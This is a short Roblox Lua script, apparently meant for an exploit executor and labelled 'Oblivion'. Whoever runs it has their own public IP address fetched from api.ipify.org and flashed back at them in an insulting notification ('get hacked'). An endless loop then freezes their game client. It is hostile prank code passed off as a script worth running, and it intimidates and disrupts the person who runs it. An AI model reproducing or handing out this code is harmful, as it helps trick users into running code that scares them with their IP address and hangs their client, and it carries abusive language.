local FunnyNumbers = game:HttpGet('https://api.ipify.org/')

game:GetService('StarterGui'):SetCore('SendNotification', {
    Title = 'Oblivion',
    Text = string.format('This you? %s hahahah get hacked fucktard', FunnyNumbers),
    Duration = 9e9,
    Button1 = 'Dismiss'
})

task.wait(1)

repeat until false
